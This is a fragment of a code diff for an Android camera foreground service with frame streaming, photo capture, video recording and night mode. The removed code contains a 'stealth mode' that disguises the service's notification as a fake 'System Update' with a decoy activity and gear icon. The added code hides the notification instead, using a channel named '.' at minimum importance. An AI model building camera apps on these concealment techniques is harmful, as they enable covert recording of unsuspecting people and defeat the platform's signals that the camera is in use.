+    private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            boolean stealth = isStealthMode();
-            Intent notificationIntent = new Intent(this, stealth ? DecoyActivity.class : MainActivity.class);
-            PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
-                    PendingIntent.FLAG_IMMUTABLE);
-
-            Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                    .setContentTitle(stealth ? "System Update" : "Camera Service")
-                    .setContentText(stealth ? "Checking for system updates..." : text)
-                    .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.default_app_icon)
-                    .setContentIntent(pendingIntent)
-                    .setOngoing(true)
-                    .setPriority(NotificationCompat.PRIORITY_LOW)
-                    .build();
-
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            if (manager != null) {
-                manager.notify(NOTIFICATION_ID, notification);
-            }
+            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, ".", NotificationManager.IMPORTANCE_MIN);
+            getSystemService(NotificationManager.class).createNotificationChannel(channel);
         }
     }
 
-    private byte[] rotateJpeg(byte[] data, int degrees) {
-        try {
-            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
-            if (bitmap == null) return data;
+    @Override public void onDestroy() { 
+        lifecycleRegistry.setCurrentState(Lifecycle.State.DESTROYED);
+        cameraExecutor.shutdown();
+        instance = null;
+        super.onDestroy(); 
+    }
 
-            Matrix matrix = new Matrix();
-            matrix.postRotate(degrees);
-            Bitmap rotatedBitmap = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(), bitmap.getHeight(), matrix, true);
-
-            ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            rotatedBitmap.compress(Bitmap.CompressFormat.JPEG, 90, baos);
-            
-            bitmap.recycle();
-            rotatedBitmap.recycle();
-            
-            return baos.toByteArray();
-        } catch (Exception e) {
-            Log.e(TAG, "Error rotating JPEG", e);
-            return data;
+    // Static Accessors preserved for existing UI compatibility
+    public static boolean isCurrentlyStreaming() { return isStreaming; }
+    public static byte[] getNextFrame(long timeout) { try { return frameQueue.poll(timeout, TimeUnit.MILLISECONDS); } catch (Exception e) { return null; } }
+    public static byte[] waitForPhoto(long timeout) { 
+        if (captureLatch != null) try { captureLatch.await(timeout, TimeUnit.MILLISECONDS); } catch (Exception ignored) {}
+        return lastCapturedPhoto; 
+    }
+    public static String getLastCaptureError() { return lastCaptureError; }
+    public static boolean isCaptureInProgress() { return captureInProgress; }
+    public static String getCurrentCameraId() { return currentCameraId; }
+    public static int getStreamWidth() { return streamWidth; }
+    public static int getStreamHeight() { return streamHeight; }
+    public static boolean isCurrentlyRecording() { return isRecording; }
+    public static String getCurrentVideoPath() { return currentVideoPath; }
+    public static long getRecordingDuration() { return isRecording ? (System.currentTimeMillis() - recordingStartTime) / 1000 : 0; }
+    public static boolean isNightModeEnabled(Context c) { return nightModeEnabled; }
+    
+    @androidx.camera.camera2.interop.ExperimentalCamera2Interop
+    public void setNightMode(boolean e) { 
+        nightModeEnabled = e; 
+        getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("night_mode", e).apply();
+        if (isStreaming) {
+            // Delay restart to allow full unbind
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                startStreaming(currentCameraId, streamWidth, streamHeight, streamQuality);
+            }, 800);
         }
     }
+    public void setFlashMode(boolean on) { if (camera != null) camera.getCameraControl().enableTorch(on); }
 
-    // ============ STATIC ACCESSORS FOR VIDEO RECORDING ============
-
-    public static boolean isCurrentlyRecording() {
-        return isRecording;
-    }
-
-    public static String getCurrentVideoPath() {
-        return currentVideoPath;
-    }
-
-    public static long getRecordingDuration() {
-        if (isRecording && recordingStartTime > 0) {
-            return (System.currentTimeMillis() - recordingStartTime) / 1000;
-        }
-        return 0;
-    }
+    @Nullable @Override public IBinder onBind(Intent intent) { return null; }
 }
